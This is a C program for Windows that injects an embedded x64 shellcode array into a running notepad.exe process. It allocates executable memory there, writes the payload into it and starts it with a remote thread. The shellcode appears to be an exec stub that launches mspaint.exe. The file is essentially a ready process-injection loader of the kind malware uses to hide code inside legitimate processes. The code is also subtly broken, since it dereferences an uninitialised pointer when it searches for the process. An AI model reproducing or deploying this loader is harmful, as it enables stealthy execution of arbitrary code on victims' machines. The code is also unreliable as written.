#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <string.h>

const char* k = "[+]";
const char* i = "[*]";
const char* e = "[-]";

DWORD PID = NULL;
DWORD TID = NULL;
HANDLE hProcess, hThread = NULL;
LPVOID rBuffer = NULL;

unsigned char payload[] = {
  0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
  0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
  0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
  0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
  0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
  0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
  0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
  0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
  0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
  0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
  0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
  0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
  0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
  0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
  0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
  0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
  0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
  0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
  0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
  0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
  0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
  0xda, 0xff, 0xd5, 0x6d, 0x73, 0x70, 0x61, 0x69, 0x6e, 0x74, 0x2e, 0x65,
  0x78, 0x65, 0x00
};

PROCESSENTRY32* GetHandleFromName(char* sFileName){
    PROCESSENTRY32* entry;
    entry->dwSize = sizeof(PROCESSENTRY32);
    
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if(Process32First(hSnap, entry)){
        while(Process32Next(hSnap, entry)){
            if(!stricmp(entry->szExeFile, sFileName)){
                return entry;
            }
        }
    }

    return NULL;
}



int main(int argc, char* argv[]){
    PROCESSENTRY32* entry = GetHandleFromName("notepad.exe");
    if(entry == NULL){
        printf("%s couldn't get the process entry\n", e);
        return EXIT_FAILURE;
    }
    
	PID = entry->th32ProcessID;
	printf("%s trying to open a handle to process (%ld)\n", i, PID);

	hProcess = OpenProcess(
		PROCESS_ALL_ACCESS, 
        FALSE,
		PID
	);
	printf("%s got a handle to the process!\n\\---0x%p\n", k, hProcess);

	if(hProcess == NULL){
		printf("%s couldn't get a handle to the process (%ld), error: %ld\n", e, PID, GetLastError());
		return EXIT_FAILURE;
	}

	rBuffer = VirtualAllocEx(
		hProcess,
		NULL,
		sizeof(payload),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE
	);
	printf("%s allocated %zu-bytes with rwx permissions\n", k, sizeof(payload));

	WriteProcessMemory(
		hProcess,
		rBuffer,
		payload,
		sizeof(payload),
		NULL
	);
	printf("%s wrote %zu-bytes to process memory\n", k, sizeof(payload));

	hThread = CreateRemoteThreadEx(
		hProcess,
		NULL,
		0,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		0,
		0,
		&TID
	);

	if(hThread == NULL){
		printf("%s failed to get a handle to the thread, error: %ld\n", e, GetLastError());
		CloseHandle(hProcess);
		return EXIT_FAILURE;
	}
	printf("%s got a handle to the thread (%ld)\n\\---0x%p\n", k, TID, hThread);

	WaitForSingleObject(hThread, INFINITE);

	printf("%s cleaning up\n", i);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished!\n", k);

	return EXIT_SUCCESS;
}
